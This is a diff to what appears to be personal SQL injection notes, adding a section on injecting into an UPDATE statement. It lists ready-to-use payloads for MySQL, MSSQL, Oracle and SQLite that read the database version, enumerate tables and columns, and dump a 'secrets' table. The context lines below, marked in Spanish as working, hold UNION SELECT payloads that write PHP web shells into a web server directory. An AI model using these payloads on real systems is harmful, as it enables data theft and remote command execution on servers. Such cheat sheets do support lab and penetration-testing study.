@@ -74,7 +74,27 @@ https://www.sqlinjection.net/
 Labs github
 https://github.com/Audi-1/sqli-labs
 
+### SQLITE
 
+Injection Attack on an UPDATE Statement
+We will now enumerate the database via the UPDATE statement on the profile page. We will assume we have no prior knowledge of the database. By looking at the web page's source code, we can identify potential column names by looking at the name attribute.
+```java
+# MySQL and MSSQL
+',nickName=@@version,email='
+# For Oracle
+',nickName=(SELECT banner FROM v$version),email='
+# For SQLite
+',nickName=sqlite_version(),email='
+```
+
+```java
+# All tables
+',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
+# Column name specific table
+',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
+# Group concat
+',nickName=(SELECT group_concat(	id || "," || 	author || "," || secret || ":") from secrets),email='
+```
 ---funciona los tres
 ') union select "","", "<?php system($_GET['cmd']); ?>", "" into outfile  '/var/www/chattr-prod/shell17.php' -- -
 ') union select '','','',"<?php system($_REQUEST[0]); ?>" into outfile  '/var/www/chattr-prod/shell18.php' -- -
